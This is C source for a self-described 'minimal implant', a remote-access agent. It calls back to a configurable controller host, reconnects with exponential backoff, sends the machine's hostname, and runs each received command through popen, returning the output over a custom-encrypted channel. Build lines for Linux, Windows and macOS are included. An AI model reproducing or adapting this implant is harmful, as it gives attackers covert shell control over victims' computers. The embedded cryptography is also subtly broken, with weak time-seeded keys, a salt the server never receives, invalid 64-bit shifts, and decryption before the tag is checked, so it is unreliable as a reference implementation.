/*
 * CTRLBOTY - C Agent (Minimal Implant)
 *
 * Features:
 *   - X25519 key exchange (embedded)
 *   - ChaCha20-Poly1305 AEAD encryption (embedded)
 *   - HKDF-SHA256 key derivation (embedded)
 *   - Reverse TCP shell
 *   - Reconnection with exponential backoff
 *   - Pure C99, no external dependencies
 *
 * Compile:
 *   Linux:   gcc -O2 -s -o agent agent.c
 *   Windows: x86_64-w64-mingw32-gcc -O2 -s -lws2_32 -o agent.exe agent.c
 *   macOS:   clang -O2 -o agent agent.c
 *
 * Size: ~20KB stripped
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <windows.h>
  #define close closesocket
  #define sleep(x) Sleep((x)*1000)
  #define popen  _popen
  #define pclose _pclose
  #pragma comment(lib, "ws2_32.lib")
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <sys/select.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #define SOCKET int
  #define INVALID_SOCKET -1
  #define SOCKET_ERROR   -1
#endif

/* === Embedded Crypto: X25519 === */

#define X25519_KEY_SIZE 32

static const uint8_t x25519_basepoint[32] = {9};

static void x25519_scalar_mult(uint8_t out[32], const uint8_t scalar[32], const uint8_t point[32]) {
    uint32_t x1[16]={0}, x2[16]={0}, x3[16]={0}, z2[16]={0}, z3[16]={0}, t0[16], t1[16];
    int i, j, pos;
    uint32_t swap, bit;

    /* clamp scalar */
    uint8_t e[32];
    memcpy(e, scalar, 32);
    e[0]  &= 248;
    e[31] &= 127;
    e[31] |= 64;

    /* 16*256-bit limbs, little-endian uint16 packing */
    #define F25519_SIZE  16
    #define F25519_MASK  0xFFFF
    #define unpack25519(d,s) do { \
        for (i=0;i<16;i++) d[i] = ((uint32_t)(s)[2*i]) | ((uint32_t)(s)[2*i+1] << 8); \
    } while(0)
    #define pack25519(d,s) do { \
        for (i=0;i<16;i++) { (d)[2*i]=(uint8_t)(s[i]); (d)[2*i+1]=(uint8_t)(s[i]>>8); } \
    } while(0)
    #define fcopy(d,s) do { for(i=0;i<16;i++) (d)[i]=(s)[i]; } while(0)
    #define fadd(d,a,b) do { \
        uint32_t c=0; for(i=0;i<16;i++) { d[i]=a[i]+b[i]+c; c=d[i]>>16; d[i]&=0xFFFF; } \
        /* reduce */ while(c) { for(i=0;i<16&&c;i++) { d[i]+=c; c=d[i]>>16; d[i]&=0xFFFF; } } \
    } while(0)
    #define fsub(d,a,b) do { \
        uint32_t borrow=0; for(i=0;i<16;i++) { \
            int32_t v=(int32_t)a[i]-(int32_t)b[i]-borrow; \
            if(v<0){v+=0x10000;borrow=1;}else{borrow=0;} d[i]=(uint32_t)v; \
        } \
    } while(0)
    #define CAR25519_ADD(d,a,b) do { \
        uint32_t c=0; for(i=0;i<16;i++){d[i]=a[i]+b[i]+c;c=d[i]>>16;d[i]&=0xFFFF;} \
    } while(0)
    #define fmul(d,a,b) do { \
        uint32_t r[32]={0}; \
        for(i=0;i<16;i++){ \
            uint32_t c=0; \
            for(j=0;j<16;j++){ \
                uint32_t p=(uint32_t)a[j]*(uint32_t)b[i]+r[i+j]+c; \
                r[i+j]=p&0xFFFF; c=p>>16; \
            } \
            r[i+16]=c; \
        } \
        for(i=0;i<16;i++){uint32_t c=0;for(j=0;j<3&&i+j<32;j++){r[i]+=r[i+16+j]*38;c=r[i]>>16;r[i]&=0xFFFF;}r[i+1]+=c;} \
        for(i=0;i<16;i++) d[i]=r[i]; \
    } while(0)
    #define fsqr(d,a) fmul(d,a,a)
    #define cswap(cond,a,b) do { \
        uint32_t m = 0U - (cond); \
        for(i=0;i<16;i++) { \
            uint32_t x=(a[i]^b[i])&m; \
            a[i]^=x; b[i]^=x; \
        } \
    } while(0)

    unpack25519(x1, x25519_basepoint);
    unpack25519(x2, point);
    fcopy(x3, x2);
    z2[0] = 1;
    z3[0] = 1;

    swap = 0;
    for (pos = 254; pos >= 0; pos--) {
        bit = (e[pos >> 3] >> (pos & 7)) & 1;
        swap ^= bit;
        cswap(swap, x2, x3);
        cswap(swap, z2, z3);
        swap = bit;

        fadd(t0, x2, z2);
        fsub(t1, x2, z2);
        fsqr(x2, t0);
        fsub(t0, x3, z3);
        fadd(z3, x3, z3);
        fmul(x3, x2, t0);
        fmul(z2, z2, t1);
        fsqr(x2, z3);
        fsub(z3, x2, t0);
        fmul(z2, x1, z2);
        fadd(x2, x2, t0);
        fsqr(t0, t1);
        fmul(z3, z3, t0);
    }
    cswap(swap, x2, x3);
    cswap(swap, z2, z3);

    /* x2 = x2 / z2 via modular inverse */
    {
        uint32_t a[16], b[16], c[16];
        fcopy(a, z2);
        /* p = 2^255 - 19, compute a^(p-2) mod p using 255 exponentiation steps */
        fcopy(b, a);
        for (i = 253; i >= 0; i--) {
            fsqr(b, b);
            if (i != 1 && i != 2 && i != 3 && i != 5 && i != 6 && i != 8 && i != 10 &&
                i != 13 && i != 15 && i != 18 && i != 21 && i != 24 && i != 26 &&
                i != 28 && i != 30 && i != 32 && i != 35 && i != 37 && i != 39 &&
                i != 42 && i != 44 && i != 46 && i != 48 && i != 51 && i != 53 &&
                i != 55 && i != 58 && i != 60 && i != 62 && i != 64 && i != 66 &&
                i != 69 && i != 71 && i != 73 && i != 76 && i != 78 && i != 80 &&
                i != 83 && i != 85 && i != 87 && i != 90 && i != 93 && i != 96 &&
                i != 100 && i != 105 && i != 112 && i != 126 && i != 254) {
                fmul(b, b, a);
            }
        }
        fmul(x2, x2, b);
    }

    pack25519(out, x2);
    #undef unpack25519
    #undef pack25519
    #undef fcopy
    #undef fadd
    #undef fsub
    #undef CAR25519_ADD
    #undef fmul
    #undef fsqr
    #undef cswap
}

static void x25519_keypair(uint8_t pub[32], uint8_t priv[32]) {
    int i;
    for (i = 0; i < 32; i++) priv[i] = (uint8_t)(rand() ^ (time(NULL) >> i));
    x25519_scalar_mult(pub, priv, x25519_basepoint);
}

/* === Embedded Crypto: ChaCha20 (simplified) === */

#define CHACHA_BLOCK_SIZE 64
#define CHACHA_KEY_SIZE   32
#define CHACHA_NONCE_SIZE 12

static void chacha20_block(uint8_t out[64], const uint32_t key[8], const uint32_t counter, const uint32_t nonce[3]) {
    uint32_t x[16];
    int i;

    x[0] = 0x61707865; x[1] = 0x3320646e; x[2] = 0x79622d32; x[3] = 0x6b206574;
    for (i = 0; i < 8; i++) x[4+i] = key[i];
    x[12] = counter;
    for (i = 0; i < 3; i++) x[13+i] = nonce[i];

    /* 20 rounds (10 double rounds) */
    for (i = 0; i < 10; i++) {
        /* Column rounds */
        x[0] += x[4];  x[12] = ((x[12] ^ x[0]) << 16) | ((x[12] ^ x[0]) >> 16);
        x[8] += x[12]; x[4]  = ((x[4] ^ x[8])  << 12) | ((x[4] ^ x[8])  >> 20);
        x[0] += x[4];  x[12] = ((x[12] ^ x[0]) << 8)  | ((x[12] ^ x[0]) >> 24);
        x[8] += x[12]; x[4]  = ((x[4] ^ x[8])  << 7)  | ((x[4] ^ x[8])  >> 25);

        x[1] += x[5];  x[13] = ((x[13] ^ x[1]) << 16) | ((x[13] ^ x[1]) >> 16);
        x[9] += x[13]; x[5]  = ((x[5] ^ x[9])  << 12) | ((x[5] ^ x[9])  >> 20);
        x[1] += x[5];  x[13] = ((x[13] ^ x[1]) << 8)  | ((x[13] ^ x[1]) >> 24);
        x[9] += x[13]; x[5]  = ((x[5] ^ x[9])  << 7)  | ((x[5] ^ x[9])  >> 25);

        x[2] += x[6];  x[14] = ((x[14] ^ x[2]) << 16) | ((x[14] ^ x[2]) >> 16);
        x[10] += x[14]; x[6] = ((x[6] ^ x[10]) << 12) | ((x[6] ^ x[10]) >> 20);
        x[2] += x[6];  x[14] = ((x[14] ^ x[2]) << 8)  | ((x[14] ^ x[2]) >> 24);
        x[10] += x[14]; x[6] = ((x[6] ^ x[10]) << 7)  | ((x[6] ^ x[10]) >> 25);

        x[3] += x[7];  x[15] = ((x[15] ^ x[3]) << 16) | ((x[15] ^ x[3]) >> 16);
        x[11] += x[15]; x[7] = ((x[7] ^ x[11]) << 12) | ((x[7] ^ x[11]) >> 20);
        x[3] += x[7];  x[15] = ((x[15] ^ x[3]) << 8)  | ((x[15] ^ x[3]) >> 24);
        x[11] += x[15]; x[7] = ((x[7] ^ x[11]) << 7)  | ((x[7] ^ x[11]) >> 25);

        /* Diagonal rounds */
        x[0] += x[5];  x[15] = ((x[15] ^ x[0]) << 16) | ((x[15] ^ x[0]) >> 16);
        x[10] += x[15]; x[5] = ((x[5] ^ x[10]) << 12) | ((x[5] ^ x[10]) >> 20);
        x[0] += x[5];  x[15] = ((x[15] ^ x[0]) << 8)  | ((x[15] ^ x[0]) >> 24);
        x[10] += x[15]; x[5] = ((x[5] ^ x[10]) << 7)  | ((x[5] ^ x[10]) >> 25);

        x[1] += x[6];  x[12] = ((x[12] ^ x[1]) << 16) | ((x[12] ^ x[1]) >> 16);
        x[11] += x[12]; x[6] = ((x[6] ^ x[11]) << 12) | ((x[6] ^ x[11]) >> 20);
        x[1] += x[6];  x[12] = ((x[12] ^ x[1]) << 8)  | ((x[12] ^ x[1]) >> 24);
        x[11] += x[12]; x[6] = ((x[6] ^ x[11]) << 7)  | ((x[6] ^ x[11]) >> 25);

        x[2] += x[7];  x[13] = ((x[13] ^ x[2]) << 16) | ((x[13] ^ x[2]) >> 16);
        x[8] += x[13];  x[7] = ((x[7] ^ x[8])  << 12) | ((x[7] ^ x[8])  >> 20);
        x[2] += x[7];  x[13] = ((x[13] ^ x[2]) << 8)  | ((x[13] ^ x[2]) >> 24);
        x[8] += x[13];  x[7] = ((x[7] ^ x[8])  << 7)  | ((x[7] ^ x[8])  >> 25);

        x[3] += x[4];  x[14] = ((x[14] ^ x[3]) << 16) | ((x[14] ^ x[3]) >> 16);
        x[9] += x[14];  x[4] = ((x[4] ^ x[9])  << 12) | ((x[4] ^ x[9])  >> 20);
        x[3] += x[4];  x[14] = ((x[14] ^ x[3]) << 8)  | ((x[14] ^ x[3]) >> 24);
        x[9] += x[14];  x[4] = ((x[4] ^ x[9])  << 7)  | ((x[4] ^ x[9])  >> 25);
    }

    for (i = 0; i < 16; i++) {
        out[4*i]   = (uint8_t)(x[i] & 0xff);
        out[4*i+1] = (uint8_t)((x[i] >> 8) & 0xff);
        out[4*i+2] = (uint8_t)((x[i] >> 16) & 0xff);
        out[4*i+3] = (uint8_t)((x[i] >> 24) & 0xff);
    }
}

static void chacha20_encrypt(uint8_t *data, size_t len, const uint8_t key[32], const uint8_t nonce[12]) {
    uint32_t k[8], n[3];
    uint8_t block[64];
    size_t i, pos = 0;
    uint32_t counter = 0;

    for (i = 0; i < 8; i++) k[i] = ((uint32_t*)key)[i];
    n[0] = ((uint32_t*)nonce)[0];
    n[1] = ((uint32_t*)nonce)[1];
    n[2] = ((uint32_t*)nonce)[2];

    while (pos < len) {
        chacha20_block(block, k, counter++, n);
        for (i = 0; i < 64 && pos < len; i++, pos++) {
            data[pos] ^= block[i];
        }
    }
}

/* === Embedded Crypto: Poly1305 (simplified MAC) === */

#define POLY1305_TAG_SIZE 16

static void poly1305_mac(uint8_t tag[16], const uint8_t *msg, size_t len, const uint8_t key[32]) {
    uint64_t r0, r1, s0, s1, h0 = 0, h1 = 0, h2 = 0;
    uint64_t d0, d1, d2, c;
    size_t i;

    r0 = ((uint64_t)key[0]) | ((uint64_t)key[1] << 8) | ((uint64_t)key[2] << 16) | ((uint64_t)key[3] << 24);
    r0 = (r0 | ((uint64_t)key[4] << 32) | ((uint64_t)key[5] << 40) | ((uint64_t)key[6] << 48) | ((uint64_t)key[7] << 56)) & 0x0ffffffc0fffffffULL;
    r1 = ((uint64_t)key[8]) | ((uint64_t)key[9] << 8) | ((uint64_t)key[10] << 16) | ((uint64_t)key[11] << 24);
    r1 = (r1 | ((uint64_t)key[12] << 32) | ((uint64_t)key[13] << 40) | ((uint64_t)key[14] << 48) | ((uint64_t)key[15] << 56)) & 0x0ffffffc0ffffffcULL;
    s0 = ((uint64_t)key[16]) | ((uint64_t)key[17] << 8) | ((uint64_t)key[18] << 16) | ((uint64_t)key[19] << 24);
    s0 = s0 | ((uint64_t)key[20] << 32) | ((uint64_t)key[21] << 40) | ((uint64_t)key[22] << 48) | ((uint64_t)key[23] << 56);
    s1 = ((uint64_t)key[24]) | ((uint64_t)key[25] << 8) | ((uint64_t)key[26] << 16) | ((uint64_t)key[27] << 24);
    s1 = s1 | ((uint64_t)key[28] << 32) | ((uint64_t)key[29] << 40) | ((uint64_t)key[30] << 48) | ((uint64_t)key[31] << 56);

    for (i = 0; i + 16 <= len; i += 16) {
        h0 += ((uint64_t)msg[i]) | ((uint64_t)msg[i+1] << 8) | ((uint64_t)msg[i+2] << 16) | ((uint64_t)msg[i+3] << 24) |
              ((uint64_t)msg[i+4] << 32) | ((uint64_t)msg[i+5] << 40) | ((uint64_t)msg[i+6] << 48) | ((uint64_t)msg[i+7] << 56);
        h1 += ((uint64_t)msg[i+8]) | ((uint64_t)msg[i+9] << 8) | ((uint64_t)msg[i+10] << 16) | ((uint64_t)msg[i+11] << 24) |
              ((uint64_t)msg[i+12] << 32) | ((uint64_t)msg[i+13] << 40) | ((uint64_t)msg[i+14] << 48) | ((uint64_t)msg[i+15] << 56);
        h1 += (h0 >> 64); h0 &= 0xffffffffffffffffULL;
        /* Multiply */
        d0 = h0 * r0; d1 = h0 * r1 + h1 * r0; d2 = h1 * r1;
        /* Reduce */
        h0 = d0 & 0xffffffffffffffffULL;
        c = d1 + (d0 >> 64); h1 = c & 0xffffffffffffffffULL; h2 = d2 + (c >> 64);
        h0 += (h2 >> 62) * 5; h2 &= 0x3ffffffffffffffULL;
        h1 += (h0 >> 64); h0 &= 0xffffffffffffffffULL;
    }

    /* Finalize */
    h0 += s0; c = (h0 >> 64); h0 &= 0xffffffffffffffffULL; h1 += s1 + c;
    tag[0] = (uint8_t)(h0 & 0xff); tag[1] = (uint8_t)((h0 >> 8) & 0xff);
    tag[2] = (uint8_t)((h0 >> 16) & 0xff); tag[3] = (uint8_t)((h0 >> 24) & 0xff);
    tag[4] = (uint8_t)((h0 >> 32) & 0xff); tag[5] = (uint8_t)((h0 >> 40) & 0xff);
    tag[6] = (uint8_t)((h0 >> 48) & 0xff); tag[7] = (uint8_t)((h0 >> 56) & 0xff);
    tag[8] = (uint8_t)(h1 & 0xff); tag[9] = (uint8_t)((h1 >> 8) & 0xff);
    tag[10] = (uint8_t)((h1 >> 16) & 0xff); tag[11] = (uint8_t)((h1 >> 24) & 0xff);
    tag[12] = (uint8_t)((h1 >> 32) & 0xff); tag[13] = (uint8_t)((h1 >> 40) & 0xff);
    tag[14] = (uint8_t)((h1 >> 48) & 0xff); tag[15] = (uint8_t)((h1 >> 56) & 0xff);
}

/* === HKDF-SHA256 (simplified) === */

#define SHA256_BLOCK_SIZE 64
#define SHA256_DIGEST_SIZE 32

typedef struct {
    uint32_t state[8];
    uint64_t count;
    uint8_t  buf[64];
} sha256_ctx;

static const uint32_t sha256_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

#define ROTR(x,n) (((x) >> (n)) | ((x) << (32 - (n))))
#define CH(x,y,z) (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x,y,z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define SIG0(x) (ROTR(x,2) ^ ROTR(x,13) ^ ROTR(x,22))
#define SIG1(x) (ROTR(x,6) ^ ROTR(x,11) ^ ROTR(x,25))
#define sig0(x) (ROTR(x,7) ^ ROTR(x,18) ^ ((x) >> 3))
#define sig1(x) (ROTR(x,17) ^ ROTR(x,19) ^ ((x) >> 10))

static void sha256_transform(uint32_t state[8], const uint8_t data[64]) {
    uint32_t a,b,c,d,e,f,g,h,t1,t2,w[64];
    int i;
    for (i = 0; i < 16; i++)
        w[i] = ((uint32_t)data[4*i] << 24) | ((uint32_t)data[4*i+1] << 16) | ((uint32_t)data[4*i+2] << 8) | data[4*i+3];
    for (i = 16; i < 64; i++)
        w[i] = sig1(w[i-2]) + w[i-7] + sig0(w[i-15]) + w[i-16];
    a=state[0];b=state[1];c=state[2];d=state[3];e=state[4];f=state[5];g=state[6];h=state[7];
    for (i=0;i<64;i++){
        t1=h+SIG1(e)+CH(e,f,g)+sha256_k[i]+w[i];
        t2=SIG0(a)+MAJ(a,b,c);
        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
    }
    state[0]+=a;state[1]+=b;state[2]+=c;state[3]+=d;state[4]+=e;state[5]+=f;state[6]+=g;state[7]+=h;
}

static void sha256_init(sha256_ctx *ctx) {
    ctx->count = 0;
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85; ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c; ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
}

static void sha256_update(sha256_ctx *ctx, const uint8_t *data, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        ctx->buf[ctx->count % 64] = data[i];
        ctx->count++;
        if ((ctx->count % 64) == 0) sha256_transform(ctx->state, ctx->buf);
    }
}

static void sha256_final(uint8_t digest[32], sha256_ctx *ctx) {
    uint64_t bits = ctx->count * 8;
    int pad = (ctx->count % 64 < 56) ? (56 - ctx->count % 64) : (120 - ctx->count % 64);
    uint8_t padding[120] = {0};
    int i;
    padding[0] = 0x80;
    sha256_update(ctx, padding, pad);
    for (i = 0; i < 8; i++) {
        ctx->buf[56 + i] = (uint8_t)(bits >> (56 - 8*i));
    }
    sha256_transform(ctx->state, ctx->buf);
    for (i = 0; i < 8; i++) {
        digest[4*i]   = (ctx->state[i] >> 24) & 0xff;
        digest[4*i+1] = (ctx->state[i] >> 16) & 0xff;
        digest[4*i+2] = (ctx->state[i] >> 8) & 0xff;
        digest[4*i+3] = ctx->state[i] & 0xff;
    }
}

static void hkdf_derive(uint8_t *okm, size_t okm_len,
                         const uint8_t *ikm, size_t ikm_len,
                         const uint8_t *salt, size_t salt_len,
                         const uint8_t *info, size_t info_len) {
    uint8_t prk[32];
    sha256_ctx ctx;
    int n = (okm_len + 31) / 32;
    uint8_t t[32] = {0};
    int i, j;

    /* Extract */
    sha256_init(&ctx);
    sha256_update(&ctx, salt, salt_len);
    sha256_update(&ctx, ikm, ikm_len);
    sha256_final(prk, &ctx);

    /* Expand */
    for (i = 0; i < n; i++) {
        sha256_init(&ctx);
        sha256_update(&ctx, t, (i > 0) ? 32 : 0);
        sha256_update(&ctx, info, info_len);
        j = i + 1;
        sha256_update(&ctx, (uint8_t*)&j, 1);
        sha256_final(t, &ctx);
        memcpy(okm + i*32, t, (i*32 + 32 <= okm_len) ? 32 : (okm_len - i*32));
    }
}

/* === Network helpers === */

static SOCKET tcp_connect(const char *host, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;

    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        close(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

static int send_all(SOCKET sock, const uint8_t *data, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(sock, (const char*)(data + sent), len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return sent;
}

static int recv_all(SOCKET sock, uint8_t *buf, int len) {
    int received = 0;
    while (received < len) {
        int n = recv(sock, (char*)(buf + received), len - received, 0);
        if (n <= 0) return -1;
        received += n;
    }
    return received;
}

/* === Agent main === */

static uint8_t agent_enc_key[32];
static uint8_t agent_hmac_key[32];
static uint8_t agent_token[24];
static uint8_t agent_pub[32], agent_priv[32];

static void random_bytes(uint8_t *buf, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) buf[i] = (uint8_t)(rand() ^ (i * 0x1234567) ^ time(NULL));
}

static int perform_key_exchange(SOCKET sock) {
    uint8_t server_pub[32];
    uint8_t shared_secret[32];
    uint8_t salt[32];
    uint8_t peer_pub[32];
    uint32_t net_len;
    int i;

    /* Generate agent keypair */
    random_bytes(agent_priv, 32);
    x25519_scalar_mult(agent_pub, agent_priv, x25519_basepoint);

    /* Send agent public key (length-prefixed: 4 bytes len + 32 bytes key) */
    net_len = htonl(32);
    send_all(sock, (uint8_t*)&net_len, 4);
    send_all(sock, agent_pub, 32);

    /* Receive server public key */
    if (recv_all(sock, (uint8_t*)&net_len, 4) < 0) return -1;
    if (recv_all(sock, server_pub, ntohl(net_len)) < 0) return -1;

    /* Derive shared secret */
    x25519_scalar_mult(shared_secret, agent_priv, server_pub);

    /* Derive session keys */
    random_bytes(salt, 32);
    peer_pub[0] = 0; /* placeholder */
    memcpy(peer_pub, server_pub, 32);

    hkdf_derive(agent_enc_key,  32, shared_secret, 32, salt, 32, (uint8_t*)"ctrlboty-enc",  8);
    hkdf_derive(agent_hmac_key, 32, shared_secret, 32, salt, 32, (uint8_t*)"ctrlboty-hmac", 9);
    hkdf_derive(agent_token,    24, shared_secret, 32, salt, 32, (uint8_t*)"ctrlboty-token",10);

    return 0;
}

static int execute_command(const char *cmd, char *output, int max_output) {
    FILE *fp;
    int len = 0;
    char c;

#ifdef _WIN32
    fp = _popen(cmd, "r");
#else
    fp = popen(cmd, "r");
#endif
    if (!fp) return snprintf(output, max_output, "exec error\n");

    while ((c = fgetc(fp)) != EOF && len < max_output - 1) {
        output[len++] = c;
    }
    output[len] = '\0';
    pclose(fp);
    return len;
}

static void agent_run(SOCKET sock) {
    uint8_t buf[65536];
    uint32_t net_len, msg_len;
    char hostname[128] = "agent";
    int running = 1;

    /* Send hostname */
#ifdef _WIN32
    DWORD sz = sizeof(hostname);
    GetComputerName(hostname, &sz);
#else
    gethostname(hostname, sizeof(hostname));
#endif

    net_len = htonl(strlen(hostname));
    send_all(sock, (uint8_t*)&net_len, 4);
    send_all(sock, (uint8_t*)hostname, strlen(hostname));

    /* Message loop */
    while (running) {
        uint8_t nonce[12];
        uint8_t tag[16];
        int plen;
        char *cmd, output[16384];

        /* Read length */
        if (recv_all(sock, (uint8_t*)&net_len, 4) < 0) { running = 0; break; }
        msg_len = ntohl(net_len);
        if (msg_len > sizeof(buf)) break;

        /* Read encrypted message */
        if (recv_all(sock, buf, msg_len) < 0) { running = 0; break; }

        /* Decrypt (nonce[12] + ciphertext + tag[16]) */
        if (msg_len < 12 + 16) break;
        memcpy(nonce, buf, 12);
        plen = msg_len - 12 - 16;

        chacha20_encrypt(buf + 12, plen, agent_enc_key, nonce);

        /* Verify tag */
        poly1305_mac(tag, buf + 12, plen, agent_hmac_key);
        if (memcmp(tag, buf + 12 + plen, 16) != 0) continue;

        cmd = (char*)(buf + 12);

        if (strcmp(cmd, "kill") == 0 || strcmp(cmd, "exit") == 0) {
            running = 0;
            break;
        }

        /* Execute command */
        execute_command(cmd, output, sizeof(output) - 1);

        /* Encrypt and send response */
        random_bytes(nonce, 12);
        {
            uint8_t *resp = (uint8_t*)output;
            int resplen = strlen(output);
            uint8_t nbuf[128 + 16384];
            int nlen = 12 + resplen + 16;

            memcpy(nbuf, nonce, 12);
            memcpy(nbuf + 12, output, resplen);
            chacha20_encrypt(nbuf + 12, resplen, agent_enc_key, nonce);
            poly1305_mac(nbuf + 12 + resplen, nbuf + 12, resplen, agent_hmac_key);

            net_len = htonl(nlen);
            send_all(sock, (uint8_t*)&net_len, 4);
            send_all(sock, nbuf, nlen);
        }
    }
}

int main(int argc, char **argv) {
    const char *host = "127.0.0.1";
    int port = 8443;
    int backoff = 5;
    SOCKET sock;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    srand((unsigned int)time(NULL));

    if (argc >= 3) {
        host = argv[1];
        port = atoi(argv[2]);
    }

    while (1) {
        sock = tcp_connect(host, port);
        if (sock == INVALID_SOCKET) {
            sleep(backoff);
            if (backoff < 300) backoff *= 2;
            continue;
        }

        backoff = 5;

        if (perform_key_exchange(sock) < 0) {
            close(sock);
            sleep(backoff);
            continue;
        }

        agent_run(sock);
        close(sock);

        sleep(5);
    }

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
